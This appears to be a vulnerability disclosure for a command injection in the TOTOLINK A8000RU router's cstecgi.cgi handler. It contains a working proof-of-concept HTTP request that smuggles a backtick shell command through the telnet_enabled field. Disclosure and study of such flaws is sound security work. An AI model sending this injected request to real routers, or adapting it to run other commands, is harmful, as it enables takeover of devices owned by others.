# A8000RU Vulnerability

Vendor:TOTOLINK

Product:A8000RU

Version:7.1cu.643_b20200521	

Vulnerability: Command Injection

Download:https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/176/ids/36.html

Author:Li Tengzheng



## Descriptions

We found a Command Injection vulnerability  in `cstecgi.cgi` , allows remote attackers to execute arbitrary OS commands from a crafted request:

<div  align="center"><img src="./img/function.png" style="zoom:80%;" /></div>

In  sub_420E48 function, it reads in a user-provided parameter `telnet_enabled` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.

However ,the value of the `telnet_enabled`  is inserted into `v11`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.

<div  align="center"><img src="./img/uci.png" style="zoom:80%;" /></div>

Finally,the command will be executed by  execv() in CsteSystem

<div  align="center"><img src="./img/CsteSystem.png" style="zoom:80%;" /></div>



## Proof of Concept (PoC)

We set `telnet_enabled` as **\`ls>./setTelnetCfg.txt\`** , and the router will execute it,such as:

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.6.2
Content-Length: 80
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Origin: http://192.168.6.2
Referer: http://192.168.6.2/basic/index.html
Accept-Encoding: gzip, deflate, br
Cookie: SESSION_ID=2:1772465702:2
Connection: keep-alive

{"topicurl":"setTelnetCfg","telnet_enabled":"`ls>./setTelnetCfg.txt`"
}
```
<div  align="center"><img src="./img/http.png" style="zoom:80%;" /></div>

## Result

After submitting the HTTP request, we observed that the txt file was successfully created, and its content was precisely the list of filenames from the folder. This confirms that the command `ls>./setTelnetCfg.txt` was executed successfully.

<div  align="center"><img src="./img/dir.png" style="zoom:80%;" /></div>

<div  align="center"><img src="./img/content.png" style="zoom:80%;" /></div>




